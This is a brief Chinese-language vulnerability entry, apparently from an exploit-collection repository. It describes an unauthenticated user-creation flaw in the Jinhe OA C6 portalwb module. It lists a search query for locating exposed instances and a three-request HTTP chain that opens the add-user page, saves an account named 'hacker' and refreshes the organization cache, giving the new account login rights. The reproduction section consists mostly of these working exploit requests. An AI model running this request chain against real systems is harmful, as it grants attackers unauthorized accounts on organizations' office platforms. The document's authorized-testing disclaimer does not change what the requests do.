---
source: "R4gd0ll/I-Wanna-Get-All"
---

# 金和OA portalwb 未授权添加用户漏洞

## 漏洞描述

金和OA C6 portalwb 模块用户管理接口未授权访问，攻击者按三步链可直接添加管理员账户：打开添加页面 → 保存用户 → 刷新组织缓存。

## 影响版本

```
金和OA C6
```

## 网络测绘

```
app="金和OA"
```

## 漏洞复现

三步利用链（均无需登录）：

```
GET /jc6/platform/portalwb/portalwb.action HTTP/1.1

GET /jc6/platform/sys/user!add.action HTTP/1.1

POST /jc6/platform/sys/user!save.action HTTP/1.1
Content-Type: application/x-www-form-urlencoded

accounts=hacker&password=...&...

GET /jc6/platform/sys/user!refreshUserOrgCache.action?accounts=hacker HTTP/1.1
```

完成后新用户即具备登录权限。

> 仅限授权测试。PoC 逻辑提取自 I-Wanna-Get-All 集成利用工具对应模块。
